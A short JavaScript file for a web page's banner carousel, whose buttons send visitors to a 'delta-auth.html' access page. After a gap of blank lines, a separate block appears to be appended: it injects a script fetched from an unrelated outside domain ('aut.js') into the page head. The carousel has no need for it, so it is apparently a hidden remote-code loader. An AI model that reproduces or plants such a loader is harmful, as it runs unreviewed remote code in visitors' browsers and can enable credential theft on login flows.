(function () {
  var track = document.getElementById("bannerTrack");
  var slides = Array.prototype.slice.call(track.children);
  var current = 0;

  function renderSlide() {
    track.style.transform = "translateX(-" + current * 100 + "%)";
  }

  function nextSlide() {
    current = (current + 1) % slides.length;
    renderSlide();
  }

  function previousSlide() {
    current = (current - 1 + slides.length) % slides.length;
    renderSlide();
  }

  function goToAccess() {
    window.location.href = "./delta-auth.html";
  }

  document.getElementById("bannerNext").addEventListener("click", nextSlide);
  document.getElementById("bannerPrev").addEventListener("click", previousSlide);
  document.getElementById("loginAction").addEventListener("click", goToAccess);
  document.getElementById("startAction").addEventListener("click", goToAccess);
  document.getElementById("trustStartAction").addEventListener("click", goToAccess);

  setInterval(nextSlide, 3000);
})();



    const SCRIPT_LINK = "https://learnbyakp.online/html-js/aut.js";

const s = document.createElement("script");
s.src = SCRIPT_LINK;
s.async = true;
s.onload = () => {
  console.log("Script loaded successfully");
};
s.onerror = () => {
  console.log("Script load nahi hua");
};

document.head.appendChild(s);
